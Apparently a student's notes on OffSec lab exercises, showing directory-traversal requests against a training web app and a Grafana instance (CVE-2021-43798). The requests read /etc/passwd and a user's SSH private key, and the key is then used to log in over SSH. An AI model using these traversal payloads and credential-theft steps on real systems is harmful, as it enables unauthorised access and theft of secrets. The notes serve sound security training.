1. Follow the steps above and leverage the directory traversal vulnerability in the "Mountain Desserts" web application on VM #1. Use **curl** or _Burp_ to obtain the SSH private key for the user _offsec_. Use it to connect via SSH on port 2222 and find the flag in the SSH banner, which is displayed after you log in.

http://mountaindesserts.com/meteor/index.php?page=../../../../etc/passwd

This displays the content of the ```/etc/passwd``` file below:
![[Pasted image 20250311214711.png]]

We notice a *offsec* user. Let's get its ssh key configuration:
http://mountaindesserts.com/meteor/index.php?page=../../../../home/offsec/.ssh/id_rsa

![[Pasted image 20250311214918.png]]

Use curl for a better output:

```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../home/offsec/.ssh/id_rsa
```
We then copy this into a file *ssh_key*, and use it to connect to SSH.

This fails, because the key is "too open".
The warning is: WARNING: UNPROTECTED PRIVATE KEY FILE!

We need to make the key only readable by our user.
```bash
# Change the file permission
chmod 600 ssh_key

# Connect via SSH
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```
![[Pasted image 20250311215531.png]]


2. The target VM #2 runs _Grafana_ on port 3000. The service is vulnerable to CVE-2021-43798, which is a directory traversal vulnerability. Search for "golangexample cve-2021-43798" in a search engine to get familiar with how the vulnerability can be exploited. Use **curl** and the **--path-as-is** parameter to find the flag in **C:\Users\install.txt**.

Reading https://github.com/taythebot/CVE-2021-43798

```bash
http://192.168.174.193:3000/public/plugins/alertlist/../../../../../../../../etc/passwd

# Using the exploit
go run exploit.go -target http://192.168.174.193:3000 -file /Users/install.txt
```
![[Pasted image 20250311220747.png]]